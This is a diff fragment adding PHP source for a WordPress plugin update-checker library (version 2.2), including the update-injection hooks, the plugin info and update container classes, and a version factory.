+	 *
+	 * Call this when your plugin is being uninstalled, or if you want to
+	 * clear the update cache.
+	 */
+	public function resetUpdateState() {
+		delete_site_option($this->optionName);
+	}
+	
+	/**
+	 * Intercept plugins_api() calls that request information about our plugin and 
+	 * use the configured API endpoint to satisfy them. 
+	 * 
+	 * @see plugins_api()
+	 * 
+	 * @param mixed $result
+	 * @param string $action
+	 * @param array|object $args
+	 * @return mixed
+	 */
+	public function injectInfo($result, $action = null, $args = null){
+    	$relevant = ($action == 'plugin_information') && isset($args->slug) && (
+			($args->slug == $this->slug) || ($args->slug == dirname($this->pluginFile))
+		);
+		if ( !$relevant ){
+			return $result;
+		}
+		
+		$pluginInfo = $this->requestInfo();
+		$pluginInfo = apply_filters('puc_pre_inject_info-' . $this->slug, $pluginInfo);
+		if ($pluginInfo){
+			return $pluginInfo->toWpFormat();
+		}
+				
+		return $result;
+	}
+	
+	/**
+	 * Insert the latest update (if any) into the update list maintained by WP.
+	 * 
+	 * @param StdClass $updates Update list.
+	 * @return StdClass Modified update list.
+	 */
+	public function injectUpdate($updates){
+		//Is there an update to insert?
+		$update = $this->getUpdate();
+
+		//No update notifications for mu-plugins unless explicitly enabled. The MU plugin file
+		//is usually different from the main plugin file so the update wouldn't show up properly anyway.
+		if ( !empty($update) && empty($this->muPluginFile) && $this->isMuPlugin() ) {
+			$update = null;
+		}
+
+		if ( !empty($update) ) {
+			//Let plugins filter the update info before it's passed on to WordPress.
+			$update = apply_filters('puc_pre_inject_update-' . $this->slug, $update);
+			if ( !is_object($updates) ) {
+				$updates = new StdClass();
+				$updates->response = array();
+			}
+
+			$wpUpdate = $update->toWpFormat();
+			$pluginFile = $this->pluginFile;
+
+			if ( $this->isMuPlugin() ) {
+				//WP does not support automatic update installation for mu-plugins, but we can still display a notice.
+				$wpUpdate->package = null;
+				$pluginFile = $this->muPluginFile;
+			}
+			$updates->response[$pluginFile] = $wpUpdate;
+
+		} else if ( isset($updates, $updates->response) ) {
+			unset($updates->response[$this->pluginFile]);
+			if ( !empty($this->muPluginFile) ) {
+				unset($updates->response[$this->muPluginFile]);
+			}
+		}
+
+		return $updates;
+	}
+
+	/**
+	 * Rename the update directory to match the existing plugin directory.
+	 *
+	 * When WordPress installs a plugin or theme update, it assumes that the ZIP file will contain
+	 * exactly one directory, and that the directory name will be the same as the directory where
+	 * the plugin/theme is currently installed.
+	 *
+	 * GitHub and other repositories provide ZIP downloads, but they often use directory names like
+	 * "project-branch" or "project-tag-hash". We need to change the name to the actual plugin folder.
+	 *
+	 * @param string $source The directory to copy to /wp-content/plugins. Usually a subdirectory of $remoteSource.
+	 * @param string $remoteSource WordPress has extracted the update to this directory.
+	 * @param WP_Upgrader $upgrader
+	 * @return string|WP_Error
+	 */
+	function fixDirectoryName($source, $remoteSource, $upgrader) {
+		global $wp_filesystem; /** @var WP_Filesystem_Base $wp_filesystem */
+
+		//Basic sanity checks.
+		if ( !isset($source, $remoteSource, $upgrader, $upgrader->skin, $wp_filesystem) ) {
+			return $source;
+		}
+
+		//Figure out which plugin is being upgraded.
+		$pluginFile = null;
+		$skin = $upgrader->skin;
+		if ( $skin instanceof Plugin_Upgrader_Skin ) {
+			if ( isset($skin->plugin) && is_string($skin->plugin) && ($skin->plugin !== '') ) {
+				$pluginFile = $skin->plugin;
+			}
+		} elseif ( isset($skin->plugin_info) && is_array($skin->plugin_info) ) {
+			//This case is tricky because Bulk_Plugin_Upgrader_Skin (etc) doesn't actually store the plugin
+			//filename anywhere. Instead, it has the plugin headers in $plugin_info. So the best we can
+			//do is compare those headers to the headers of installed plugins.
+			if ( !function_exists('get_plugins') ){
+				require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
+			}
+
+			$installedPlugins = get_plugins();
+			$matches = array();
+			foreach($installedPlugins as $pluginBasename => $headers) {
+				$diff1 = array_diff_assoc($headers, $skin->plugin_info);
+				$diff2 = array_diff_assoc($skin->plugin_info, $headers);
+				if ( empty($diff1) && empty($diff2) ) {
+					$matches[] = $pluginBasename;
+				}
+			}
+
+			//It's possible (though very unlikely) that there could be two plugins with identical
+			//headers. In that case, we can't unambiguously identify the plugin that's being upgraded.
+			if ( count($matches) !== 1 ) {
+				return $source;
+			}
+
+			$pluginFile = reset($matches);
+		} elseif ( !empty($this->upgradedPluginFile) ) {
+			$pluginFile = $this->upgradedPluginFile;
+		}
+
+		//If WordPress is upgrading anything other than our plugin, leave the directory name unchanged.
+		if ( empty($pluginFile) || ($pluginFile !== $this->pluginFile) ) {
+			return $source;
+		}
+
+		//Rename the source to match the existing plugin directory.
+		$pluginDirectoryName = dirname($this->pluginFile);
+		if ( ($pluginDirectoryName === '.') || ($pluginDirectoryName === '/') ) {
+			return $source;
+		}
+		$correctedSource = trailingslashit($remoteSource) . $pluginDirectoryName . '/';
+		if ( $source !== $correctedSource ) {
+			//The update archive should contain a single directory that contains the rest of plugin files. Otherwise,
+			//WordPress will try to copy the entire working directory ($source == $remoteSource). We can't rename
+			//$remoteSource because that would break WordPress code that cleans up temporary files after update.
+			$sourceFiles = $wp_filesystem->dirlist($remoteSource);
+			if ( is_array($sourceFiles) ) {
+				$sourceFiles = array_keys($sourceFiles);
+				$firstFilePath = trailingslashit($remoteSource) . $sourceFiles[0];
+
+				if ( (count($sourceFiles) > 1) || (!$wp_filesystem->is_dir($firstFilePath)) ) {
+					return new WP_Error(
+						'puc-incorrect-directory-structure',
+						sprintf(
+							'The directory structure of the update is incorrect. All plugin files should be inside ' .
+							'a directory named <span class="code">%s</span>, not at the root of the ZIP file.',
+							htmlentities($this->slug)
+						)
+					);
+				}
+			}
+
+			$upgrader->skin->feedback(sprintf(
+				'Renaming %s to %s&#8230;',
+				'<span class="code">' . basename($source) . '</span>',
+				'<span class="code">' . $pluginDirectoryName . '</span>'
+			));
+
+			if ( $wp_filesystem->move($source, $correctedSource, true) ) {
+				$upgrader->skin->feedback('Plugin directory successfully renamed.');
+				return $correctedSource;
+			} else {
+				return new WP_Error(
+					'puc-rename-failed',
+					'Unable to rename the update to match the existing plugin directory.'
+				);
+			}
+		}
+
+		return $source;
+	}
+
+	/**
+	 * @access private
+	 *
+	 * @param mixed $input
+	 * @param array $hookExtra
+	 * @return mixed Returns $input unaltered.
+	 */
+	public function setUpgradedPlugin($input, $hookExtra) {
+		if (!empty($hookExtra['plugin']) && is_string($hookExtra['plugin'])) {
+			$this->upgradedPluginFile = $hookExtra['plugin'];
+		} else {
+			$this->upgradedPluginFile = null;
+		}
+		return $input;
+	}
+
+	/**
+	 * @access private
+	 *
+	 * @param mixed $input
+	 * @return mixed Returns $input unaltered.
+	 */
+	public function clearUpgradedPlugin($input = null) {
+		$this->upgradedPluginFile = null;
+		return $input;
+	}
+
+	/**
+	 * Get the details of the currently available update, if any.
+	 *
+	 * If no updates are available, or if the last known update version is below or equal
+	 * to the currently installed version, this method will return NULL.
+	 *
+	 * Uses cached update data. To retrieve update information straight from
+	 * the metadata URL, call requestUpdate() instead.
+	 *
+	 * @return PluginUpdate|null
+	 */
+	public function getUpdate() {
+		$state = $this->getUpdateState(); /** @var StdClass $state */
+
+		//Is there an update available insert?
+		if ( !empty($state) && isset($state->update) && !empty($state->update) ){
+			$update = $state->update;
+			//Check if the update is actually newer than the currently installed version.
+			$installedVersion = $this->getInstalledVersion();
+			if ( ($installedVersion !== null) && version_compare($update->version, $installedVersion, '>') ){
+				$update->filename = $this->pluginFile;
+				return $update;
+			}
+		}
+		return null;
+	}
+
+	/**
+	 * Add a "Check for updates" link to the plugin row in the "Plugins" page. By default,
+	 * the new link will appear after the "Visit plugin site" link.
+	 *
+	 * You can change the link text by using the "puc_manual_check_link-$slug" filter.
+	 * Returning an empty string from the filter will disable the link.
+	 *
+	 * @param array $pluginMeta Array of meta links.
+	 * @param string $pluginFile
+	 * @return array
+	 */
+	public function addCheckForUpdatesLink($pluginMeta, $pluginFile) {
+		$isRelevant = ($pluginFile == $this->pluginFile)
+		              || (!empty($this->muPluginFile) && $pluginFile == $this->muPluginFile);
+
+		if ( $isRelevant && current_user_can('update_plugins') ) {
+			$linkUrl = wp_nonce_url(
+				add_query_arg(
+					array(
+						'puc_check_for_updates' => 1,
+						'puc_slug' => $this->slug,
+					),
+					is_network_admin() ? esc_url_raw( network_admin_url('plugins.php')) : esc_url_raw( admin_url('plugins.php') )
+				),
+				'puc_check_for_updates'
+			);
+
+			$linkText = apply_filters('puc_manual_check_link-' . $this->slug, 'Check for updates');
+			if ( !empty($linkText) ) {
+				$pluginMeta[] = sprintf('<a href="%s">%s</a>', esc_attr($linkUrl), $linkText);
+			}
+		}
+		return $pluginMeta;
+	}
+
+	/**
+	 * Check for updates when the user clicks the "Check for updates" link.
+	 * @see self::addCheckForUpdatesLink()
+	 *
+	 * @return void
+	 */
+	public function handleManualCheck() {
+		$shouldCheck =
+			   isset($_GET['puc_check_for_updates'], $_GET['puc_slug'])
+			&& $_GET['puc_slug'] == $this->slug
+			&& current_user_can('update_plugins')
+			&& check_admin_referer('puc_check_for_updates');
+
+		if ( $shouldCheck ) {
+			$update = $this->checkForUpdates();
+			$status = ($update === null) ? 'no_update' : 'update_available';
+			wp_redirect(add_query_arg(
+					array(
+					     'puc_update_check_result' => $status,
+					     'puc_slug' => $this->slug,
+					),
+					is_network_admin() ? esc_url_raw(network_admin_url('plugins.php')) : esc_url_raw(admin_url('plugins.php'))
+			));
+		}
+	}
+
+	/**
+	 * Display the results of a manual update check.
+	 * @see self::handleManualCheck()
+	 *
+	 * You can change the result message by using the "puc_manual_check_message-$slug" filter.
+	 */
+	public function displayManualCheckResult() {
+		if ( isset($_GET['puc_update_check_result'], $_GET['puc_slug']) && ($_GET['puc_slug'] == $this->slug) ) {
+			$status = strval($_GET['puc_update_check_result']);
+			if ( $status == 'no_update' ) {
+				$message = 'This plugin is up to date.';
+			} else if ( $status == 'update_available' ) {
+				$message = 'A new version of this plugin is available.';
+			} else {
+				$message = sprintf('Unknown update checker status "%s"', htmlentities($status));
+			}
+			printf(
+				'<div class="updated"><p>%s</p></div>',
+				apply_filters('puc_manual_check_message-' . $this->slug, $message, $status)
+			);
+		}
+	}
+
+	/**
+	 * Check if the plugin file is inside the mu-plugins directory.
+	 *
+	 * @return bool
+	 */
+	protected function isMuPlugin() {
+		static $cachedResult = null;
+
+		if ( $cachedResult === null ) {
+			//Convert both paths to the canonical form before comparison.
+			$muPluginDir = realpath(WPMU_PLUGIN_DIR);
+			$pluginPath  = realpath($this->pluginAbsolutePath);
+
+			$cachedResult = (strpos($pluginPath, $muPluginDir) === 0);
+		}
+
+		return $cachedResult;
+	}
+
+	/**
+	 * Clear the cached plugin version. This method can be set up as a filter (hook) and will
+	 * return the filter argument unmodified.
+	 *
+	 * @param mixed $filterArgument
+	 * @return mixed
+	 */
+	public function clearCachedVersion($filterArgument = null) {
+		$this->cachedInstalledVersion = null;
+		return $filterArgument;
+	}
+
+	/**
+	 * Register a callback for filtering query arguments. 
+	 * 
+	 * The callback function should take one argument - an associative array of query arguments.
+	 * It should return a modified array of query arguments.
+	 * 
+	 * @uses add_filter() This method is a convenience wrapper for add_filter().
+	 * 
+	 * @param callable $callback
+	 * @return void
+	 */
+	public function addQueryArgFilter($callback){
+		add_filter('puc_request_info_query_args-'.$this->slug, $callback);
+	}
+	
+	/**
+	 * Register a callback for filtering arguments passed to wp_remote_get().
+	 * 
+	 * The callback function should take one argument - an associative array of arguments -
+	 * and return a modified array or arguments. See the WP documentation on wp_remote_get()
+	 * for details on what arguments are available and how they work. 
+	 * 
+	 * @uses add_filter() This method is a convenience wrapper for add_filter().
+	 * 
+	 * @param callable $callback
+	 * @return void
+	 */
+	public function addHttpRequestArgFilter($callback){
+		add_filter('puc_request_info_options-'.$this->slug, $callback);
+	}
+	
+	/**
+	 * Register a callback for filtering the plugin info retrieved from the external API.
+	 * 
+	 * The callback function should take two arguments. If the plugin info was retrieved 
+	 * successfully, the first argument passed will be an instance of  PluginInfo. Otherwise, 
+	 * it will be NULL. The second argument will be the corresponding return value of 
+	 * wp_remote_get (see WP docs for details).
+	 *  
+	 * The callback function should return a new or modified instance of PluginInfo or NULL.
+	 * 
+	 * @uses add_filter() This method is a convenience wrapper for add_filter().
+	 * 
+	 * @param callable $callback
+	 * @return void
+	 */
+	public function addResultFilter($callback){
+		add_filter('puc_request_info_result-'.$this->slug, $callback, 10, 2);
+	}
+
+	/**
+	 * Register a callback for one of the update checker filters.
+	 *
+	 * Identical to add_filter(), except it automatically adds the "puc_" prefix
+	 * and the "-$plugin_slug" suffix to the filter name. For example, "request_info_result"
+	 * becomes "puc_request_info_result-your_plugin_slug".
+	 *
+	 * @param string $tag
+	 * @param callable $callback
+	 * @param int $priority
+	 * @param int $acceptedArgs
+	 */
+	public function addFilter($tag, $callback, $priority = 10, $acceptedArgs = 1) {
+		add_filter('puc_' . $tag . '-' . $this->slug, $callback, $priority, $acceptedArgs);
+	}
+
+	/**
+	 * Initialize the update checker Debug Bar plugin/add-on thingy.
+	 */
+	public function initDebugBarPanel() {
+		if ( class_exists('Debug_Bar', false) ) {
+			require_once dirname(__FILE__) . '/debug-bar-plugin.php';
+			$this->debugBarPlugin = new PucDebugBarPlugin($this);
+		}
+	}
+}
+
+endif;
+
+if ( !class_exists('PluginInfo_2_2', false) ):
+
+/**
+ * A container class for holding and transforming various plugin metadata.
+ * 
+ * @author Janis Elsts
+ * @copyright 2015
+ * @version 2.2
+ * @access public
+ */
+class PluginInfo_2_2 {
+	//Most fields map directly to the contents of the plugin's info.json file.
+	//See the relevant docs for a description of their meaning.  
+	public $name;
+	public $slug;
+	public $version;
+	public $homepage;
+	public $sections;
+	public $banners;
+	public $download_url;
+
+	public $author;
+	public $author_homepage;
+	
+	public $requires;
+	public $tested;
+	public $upgrade_notice;
+	
+	public $rating;
+	public $num_ratings;
+	public $downloaded;
+	public $active_installs;
+	public $last_updated;
+	
+	public $id = 0; //The native WP.org API returns numeric plugin IDs, but they're not used for anything.
+
+	public $filename; //Plugin filename relative to the plugins directory.
+		
+	/**
+	 * Create a new instance of PluginInfo from JSON-encoded plugin info 
+	 * returned by an external update API.
+	 * 
+	 * @param string $json Valid JSON string representing plugin info.
+	 * @param bool $triggerErrors
+	 * @return PluginInfo|null New instance of PluginInfo, or NULL on error.
+	 */
+	public static function fromJson($json, $triggerErrors = false){
+		/** @var StdClass $apiResponse */
+		$apiResponse = json_decode($json);
+		if ( empty($apiResponse) || !is_object($apiResponse) ){
+			if ( $triggerErrors ) {
+				trigger_error(
+					"Failed to parse plugin metadata. Try validating your .json file with http://jsonlint.com/",
+					E_USER_NOTICE
+				);
+			}
+			return null;
+		}
+		
+		//Very, very basic validation.
+		$valid = isset($apiResponse->name) && !empty($apiResponse->name) && isset($apiResponse->version) && !empty($apiResponse->version);
+		if ( !$valid ){
+			if ( $triggerErrors ) {
+				trigger_error(
+					"The plugin metadata file does not contain the required 'name' and/or 'version' keys.",
+					E_USER_NOTICE
+				);
+			}
+			return null;
+		}
+		
+		$info = new self();
+		foreach(get_object_vars($apiResponse) as $key => $value){
+			$info->$key = $value;
+		}
+		
+		return $info;		
+	}
+	
+	/**
+	 * Transform plugin info into the format used by the native WordPress.org API
+	 * 
+	 * @return object
+	 */
+	public function toWpFormat(){
+		$info = new StdClass;
+		
+		//The custom update API is built so that many fields have the same name and format
+		//as those returned by the native WordPress.org API. These can be assigned directly. 
+		$sameFormat = array(
+			'name', 'slug', 'version', 'requires', 'tested', 'rating', 'upgrade_notice',
+			'num_ratings', 'downloaded', 'active_installs', 'homepage', 'last_updated',
+		);
+		foreach($sameFormat as $field){
+			if ( isset($this->$field) ) {
+				$info->$field = $this->$field;
+			} else {
+				$info->$field = null;
+			}
+		}
+
+		//Other fields need to be renamed and/or transformed.
+		$info->download_link = $this->download_url;
+		
+		if ( !empty($this->author_homepage) ){
+			$info->author = sprintf('<a href="%s">%s</a>', $this->author_homepage, $this->author);
+		} else {
+			$info->author = $this->author;
+		}
+		
+		if ( is_object($this->sections) ){
+			$info->sections = get_object_vars($this->sections);
+		} elseif ( is_array($this->sections) ) {
+			$info->sections = $this->sections;
+		} else {
+			$info->sections = array('description' => '');
+		}
+
+		if ( !empty($this->banners) ) {
+			//WP expects an array with two keys: "high" and "low". Both are optional.
+			//Docs: https://wordpress.org/plugins/about/faq/#banners
+			$info->banners = is_object($this->banners) ? get_object_vars($this->banners) : $this->banners;
+			$info->banners = array_intersect_key($info->banners, array('high' => true, 'low' => true));
+		}
+
+		return $info;
+	}
+}
+	
+endif;
+
+if ( !class_exists('PluginUpdate_2_2', false) ):
+
+/**
+ * A simple container class for holding information about an available update.
+ * 
+ * @author Janis Elsts
+ * @copyright 2015
+ * @version 2.2
+ * @access public
+ */
+class PluginUpdate_2_2 {
+	public $id = 0;
+	public $slug;
+	public $version;
+	public $homepage;
+	public $download_url;
+	public $upgrade_notice;
+	public $filename; //Plugin filename relative to the plugins directory.
+
+	private static $fields = array('id', 'slug', 'version', 'homepage', 'download_url', 'upgrade_notice', 'filename');
+	
+	/**
+	 * Create a new instance of PluginUpdate from its JSON-encoded representation.
+	 * 
+	 * @param string $json
+	 * @param bool $triggerErrors
+	 * @return PluginUpdate|null
+	 */
+	public static function fromJson($json, $triggerErrors = false){
+		//Since update-related information is simply a subset of the full plugin info,
+		//we can parse the update JSON as if it was a plugin info string, then copy over
+		//the parts that we care about.
+		$pluginInfo = PluginInfo_2_2::fromJson($json, $triggerErrors);
+		if ( $pluginInfo != null ) {
+			return self::fromPluginInfo($pluginInfo);
+		} else {
+			return null;
+		}
+	}
+
+	/**
+	 * Create a new instance of PluginUpdate based on an instance of PluginInfo.
+	 * Basically, this just copies a subset of fields from one object to another.
+	 * 
+	 * @param PluginInfo $info
+	 * @return PluginUpdate
+	 */
+	public static function fromPluginInfo($info){
+		return self::fromObject($info);
+	}
+	
+	/**
+	 * Create a new instance of PluginUpdate by copying the necessary fields from 
+	 * another object.
+	 *  
+	 * @param StdClass|PluginInfo|PluginUpdate $object The source object.
+	 * @return PluginUpdate The new copy.
+	 */
+	public static function fromObject($object) {
+		$update = new self();
+		$fields = self::$fields;
+		if (!empty($object->slug)) $fields = apply_filters('puc_retain_fields-'.$object->slug, $fields);
+		foreach($fields as $field){
+			if (property_exists($object, $field)) {
+				$update->$field = $object->$field;
+			}
+		}
+		return $update;
+	}
+	
+	/**
+	 * Create an instance of StdClass that can later be converted back to 
+	 * a PluginUpdate. Useful for serialization and caching, as it avoids
+	 * the "incomplete object" problem if the cached value is loaded before
+	 * this class.
+	 * 
+	 * @return StdClass
+	 */
+	public function toStdClass() {
+		$object = new StdClass();
+		$fields = self::$fields;
+		if (!empty($this->slug)) $fields = apply_filters('puc_retain_fields-'.$this->slug, $fields);
+		foreach($fields as $field){
+			if (property_exists($this, $field)) {
+				$object->$field = $this->$field;
+			}
+		}
+		return $object;
+	}
+	
+	
+	/**
+	 * Transform the update into the format used by WordPress native plugin API.
+	 * 
+	 * @return object
+	 */
+	public function toWpFormat(){
+		$update = new StdClass;
+
+		$update->id = $this->id;
+		$update->slug = $this->slug;
+		$update->new_version = $this->version;
+		$update->url = $this->homepage;
+		$update->package = $this->download_url;
+		$update->plugin = $this->filename;
+
+		if ( !empty($this->upgrade_notice) ){
+			$update->upgrade_notice = $this->upgrade_notice;
+		}
+		
+		return $update;
+	}
+}
+	
+endif;
+
+if ( !class_exists('PucFactory', false) ):
+
+/**
+ * A factory that builds instances of other classes from this library.
+ *
+ * When multiple versions of the same class have been loaded (e.g. PluginUpdateChecker 1.2
+ * and 1.3), this factory will always use the latest available version. Register class
+ * versions by calling {@link PucFactory::addVersion()}.
+ *
+ * At the moment it can only build instances of the PluginUpdateChecker class. Other classes
+ * are intended mainly for internal use and refer directly to specific implementations. If you
+ * want to instantiate one of them anyway, you can use {@link PucFactory::getLatestClassVersion()}
+ * to get the class name and then create it with <code>new $class(...)</code>.
+ */
+class PucFactory {
+	protected static $classVersions = array();
+	protected static $sorted = false;
+
+	/**
+	 * Create a new instance of PluginUpdateChecker.
+	 *
+	 * @see PluginUpdateChecker::__construct()
+	 *
+	 * @param $metadataUrl
+	 * @param $pluginFile
+	 * @param string $slug
+	 * @param int $checkPeriod
+	 * @param string $optionName
+	 * @param string $muPluginFile
+	 * @return PluginUpdateChecker
+	 */
+	public static function buildUpdateChecker($metadataUrl, $pluginFile, $slug = '', $checkPeriod = 12, $optionName = '', $muPluginFile = '') {
+		$class = self::getLatestClassVersion('PluginUpdateChecker');
+		return new $class($metadataUrl, $pluginFile, $slug, $checkPeriod, $optionName, $muPluginFile);
+	}
+
+	/**
+	 * Get the specific class name for the latest available version of a class.
+	 *
+	 * @param string $class
+	 * @return string|null
+	 */
+	public static function getLatestClassVersion($class) {
+		if ( !self::$sorted ) {
+			self::sortVersions();
+		}
+
+		if ( isset(self::$classVersions[$class]) ) {
+			return reset(self::$classVersions[$class]);
+		} else {
+			return null;
+		}
+	}
+
+	/**
+	 * Sort available class versions in descending order (i.e. newest first).
+	 */
+	protected static function sortVersions() {
+		foreach ( self::$classVersions as $class => $versions ) {
+			uksort($versions, array(__CLASS__, 'compareVersions'));
+			self::$classVersions[$class] = $versions;
+		}
+		self::$sorted = true;
+	}
+
+	protected static function compareVersions($a, $b) {
+		return -version_compare($a, $b);
+	}
+
+	/**
+	 * Register a version of a class.
+	 *
+	 * @access private This method is only for internal use by the library.
+	 *
+	 * @param string $generalClass Class name without version numbers, e.g. 'PluginUpdateChecker'.
+	 * @param string $versionedClass Actual class name, e.g. 'PluginUpdateChecker_1_2'.
+	 * @param string $version Version number, e.g. '1.2'.
+	 */
+	public static function addVersion($generalClass, $versionedClass, $version) {
+		if ( !isset(self::$classVersions[$generalClass]) ) {
+			self::$classVersions[$generalClass] = array();
+		}
+		self::$classVersions[$generalClass][$version] = $versionedClass;
+		self::$sorted = false;
+	}
+}
+
+endif;
+
+
+//Register classes defined in this file with the factory.
+PucFactory::addVersion('PluginUpdateChecker', 'PluginUpdateChecker_2_2', '2.2');
+PucFactory::addVersion('PluginUpdate', 'PluginUpdate_2_2', '2.2');
+PucFactory::addVersion('PluginInfo', 'PluginInfo_2_2', '2.2');
+PucFactory::addVersion('PucGitHubChecker', 'PucGitHubChecker_2_2', '2.2');
+
+/**
+ * Create non-versioned variants of the update checker classes. This allows for backwards
+ * compatibility with versions that did not use a factory, and it simplifies doc-comments.
+ */
+if ( !class_exists('PluginUpdateChecker', false) ) {
+	class PluginUpdateChecker extends PluginUpdateChecker_2_2 { }
+}
+
+if ( !class_exists('PluginUpdate', false) ) {
+	class PluginUpdate extends PluginUpdate_2_2 {}
+}
+
+if ( !class_exists('PluginInfo', false) ) {
+	class PluginInfo extends PluginInfo_2_2 {}
+}
